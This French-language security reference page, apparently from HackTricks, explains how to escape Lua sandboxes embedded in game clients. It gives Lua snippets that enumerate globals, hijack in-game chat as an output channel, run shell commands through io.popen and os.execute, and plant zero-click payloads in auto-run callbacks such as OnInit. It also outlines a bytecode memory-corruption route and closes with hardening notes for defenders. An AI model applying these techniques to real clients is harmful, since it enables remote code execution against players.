# Contourner les sandboxes Lua (VM embarquées, clients de jeux)

Cette page rassemble des techniques pratiques pour énumérer et s'échapper des « sandboxes » Lua intégrées aux applications (notamment les clients de jeux, les plugins ou les moteurs de scripting in-app). De nombreux moteurs exposent un environnement Lua restreint, mais laissent des variables globales puissantes accessibles, permettant l'exécution arbitraire de commandes, voire la corruption de mémoire native lorsque les chargeurs de bytecode sont exposés.

Idées clés :
- Traiter la VM comme un environnement inconnu : énumérer _G et découvrir les primitives dangereuses accessibles.
- Lorsque stdout/print est bloqué, détourner tout canal d'UI/IPC dans la VM comme sink de sortie afin d'observer les résultats.
- Si io/os est exposé, vous disposez souvent d'une exécution directe de commandes (io.popen, os.execute).
- Si load/loadstring/loadfile sont exposés, l'exécution de bytecode Lua conçu sur mesure peut compromettre la sécurité mémoire dans certaines versions (les verifiers des versions ≤5.1 peuvent être contournés ; la version 5.2 a supprimé le verifier), permettant des techniques d'exploitation avancées.

## Énumérer l'environnement sandboxé

- Vider l'environnement global pour inventorier les tables/fonctions accessibles :
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Si aucune fonction print() n'est disponible, réutilisez les canaux internes à la VM. Exemple tiré d'une VM de script de housing d'un MMO, où la sortie du chat ne fonctionne qu'après un appel sonore ; ce qui suit construit une fonction de sortie fiable :<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Généralisez ce pattern pour votre cible : tout textbox, toast, logger ou callback UI qui accepte des chaînes peut servir de stdout pour la reconnaissance.

## Direct command execution if io/os is exposed

Si la sandbox expose encore les bibliothèques standard io ou os, vous disposez probablement d’une exécution de commandes immédiate :
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notes :

- L’exécution se produit dans le processus client ; de nombreuses couches anti-cheat/antidebug qui bloquent les debuggers externes n’empêcheront pas la création de processus dans la VM.
- Vérifiez également : package.loadlib (chargement arbitraire de DLL/.so), require avec des modules natifs, le ffi de LuaJIT (s’il est présent) et la debug library (peut élever les privilèges dans la VM).

## Déclencheurs zero-click via des callbacks auto-run

Si l’application hôte pousse des scripts vers les clients et que la VM expose des hooks auto-run (par ex. OnInit/OnLoad/OnEnter), placez-y votre payload pour une compromission drive-by dès le chargement du script :<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Tout callback équivalent (OnLoad, OnEnter, etc.) généralise cette technique lorsque les scripts sont automatiquement transmis et exécutés sur le client.

## Primitives dangereuses à rechercher pendant la recon

Lors de l'énumération de _G, recherchez spécifiquement :
- io, os : io.popen, os.execute, I/O de fichiers, accès à l'environnement.
- load, loadstring, loadfile, dofile : exécution de code source ou de bytecode ; permet le chargement de bytecode non fiable.
- package, package.loadlib, require : chargement de bibliothèques dynamiques et surface des modules.
- debug : setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo et hooks.
- LuaJIT uniquement : ffi.cdef, ffi.load pour appeler directement du code natif.

Exemples d'utilisation minimaux (si accessibles) :

L'API de chargement de Lua a changé selon les versions : dans Lua 5.1, `load` lit depuis une fonction reader et `loadstring` lit depuis une chaîne ; dans Lua 5.2, `load` accepte soit une chaîne, soit une fonction reader, et `loadstring` est déprécié comme équivalent.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalade facultative : exploitation des chargeurs de bytecode Lua

Lorsque load/loadstring/loadfile sont accessibles, mais que io/os sont restreints, l'exécution de bytecode Lua forgé peut permettre la divulgation et la corruption de mémoire. Points clés :
- Lua ≤ 5.1 intégrait un vérificateur de bytecode présentant des contournements connus.<sup>[[4]](#references)</sup>
- Lua 5.2 a complètement supprimé le vérificateur (position officielle : les applications doivent simplement rejeter les chunks précompilés), ce qui élargit la surface d'attaque si le chargement de bytecode n'est pas interdit.<sup>[[2]](#references)[[3]](#references)</sup>
- Les workflows suivent généralement ce schéma : leak de pointeurs via la sortie de la VM, création de bytecode provoquant des confusions de types (par exemple autour de FORLOOP ou d'autres opcodes), puis pivot vers une lecture/écriture arbitraire ou l'exécution de code natif.<sup>[[2]](#references)[[4]](#references)</sup>

Cette voie dépend du moteur et de la version, et nécessite de la RE. Consultez les références pour des analyses approfondies, des primitives d'exploitation et des exemples de gadgets dans des jeux.

## Notes de détection et de durcissement (pour les défenseurs)

- Côté serveur : rejeter ou réécrire les scripts utilisateur ; autoriser uniquement les API sûres ; supprimer ou vider les bindings de io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Côté client : exécuter Lua avec un _ENV minimal, interdire le chargement de bytecode, réintroduire un vérificateur strict de bytecode ou des contrôles de signature, et bloquer la création de processus depuis le processus client.
- Télémétrie : générer une alerte lorsqu'un gameclient crée un processus enfant peu après le chargement d'un script ; corréler avec les événements d'interface utilisateur, de chat et de script.

## References

- [1] [Cette maison est hantée : une RCE vieille de dix ans dans le client AION (VM Lua intégrée)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Analyse du bytecode : dévoiler les failles de sécurité Lua de Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009) : discussion sur la suppression du vérificateur de bytecode](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploitation du bytecode Lua 5.1 (gist avec des contournements/notes sur le vérificateur)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Manuel de référence Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Manuel de référence Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
